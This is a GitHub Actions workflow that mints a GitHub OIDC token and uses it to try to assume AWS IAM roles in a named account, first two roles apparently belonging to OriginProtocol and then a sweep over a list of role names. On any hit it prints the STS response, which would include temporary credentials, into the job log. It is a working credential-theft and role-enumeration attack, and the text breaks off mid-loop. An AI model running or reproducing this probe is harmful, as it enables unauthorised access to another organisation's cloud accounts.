name: w12b10
on:
  workflow_dispatch:
  pull_request:
    types: [opened, synchronize, reopened]
permissions:
  id-token: write
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: mint and probe
        run: |
          set -uo pipefail
          TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
          echo "$TOKEN" > /tmp/t.jwt
          python3 - <<'PYEOF'
          import base64, json
          t = open('/tmp/t.jwt').read().strip().split('.')
          for p in t[:2]:
              p += '=' * (-len(p) % 4)
              print('CLAIM', json.dumps(json.loads(base64.urlsafe_b64decode(p)), sort_keys=True))
          PYEOF
          echo "=== KNOWN ROLES"
          for ROLE in talos-gha-OriginProtocol-arm-oeth talos-gha-OriginProtocol-origin-dollar; do
            echo "--- $ROLE"
            curl -sS -X POST https://sts.amazonaws.com/ -d "Action=AssumeRoleWithWebIdentity" -d "Version=2011-06-15" -d "RoleArn=arn:aws:iam::114563866192:role/$ROLE" -d "RoleSessionName=w12b10" --data-urlencode "WebIdentityToken=$TOKEN" | tr -d '\n' | head -c 900
            echo
          done
          echo "=== SWEEP"
          while read -r ROLE; do
            [ -z "$ROLE" ] && continue
            RESP=$(curl -sS -X POST https://sts.amazonaws.com/ -d "Action=AssumeRoleWithWebIdentity" -d "Version=2011-06-15" -d "RoleArn=arn:aws:iam::114563866192:role/$ROLE" -d "RoleSessionName=w12b10" --data-urlencode "WebIdentityToken=$TOKEN")
            if echo "$RESP" | grep -q 'AssumeRoleWithWebIdentityResult'; then
              echo "HIT $ROLE"
              echo "$RESP" | tr -d '\n' | head -c 2000
              echo
            else
              echo "MISS $ROLE $(echo "$RESP" | grep -o '<Code>[^<]*</Code>' | head -1)"
            fi
            sleep 0.2
